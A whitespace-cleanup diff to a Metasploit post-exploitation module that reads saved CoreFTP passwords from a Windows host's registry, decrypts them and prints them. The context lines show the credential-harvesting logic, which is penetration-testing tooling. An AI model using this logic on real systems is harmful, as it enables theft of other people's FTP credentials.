@@ -23,8 +23,8 @@ class Metasploit3 < Msf::Post
 		super(update_info(info,
 			'Name'          => 'Windows Gather CoreFTP Saved Password Extraction',
 			'Description'   => %q{
-				This module extracts saved passwords from the CoreFTP FTP client. These 
-			passwords are stored in the registry. They are encrypted with AES-128-ECB. 
+				This module extracts saved passwords from the CoreFTP FTP client. These
+			passwords are stored in the registry. They are encrypted with AES-128-ECB.
 			This module extracts and decrypts these passwords.
 			},
 			'License'       => MSF_LICENSE,
@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Post
 	def run
 		userhives=load_missing_hives()
 		userhives.each do |hive|
-			next if hive['HKU'] == nil 
+			next if hive['HKU'] == nil
 			print_status("Looking at Key #{hive['HKU']}")
 			begin
 				subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites")
@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Post
 					pass = decrypt(epass)
 					pass = pass.gsub(/\x00/, '') if pass != nil and pass != ''
 					print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")
-					auth = 
+					auth =
 						{
 							:host => host, :port => port, :sname => 'ftp',
 							:user => user, :pass => pass,
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Post
 				end
 			rescue
 				print_error("Cannot Access User SID: #{hive['HKU']}")
-			end 
+			end
 		end
 		unload_our_hives(userhives)
 	end
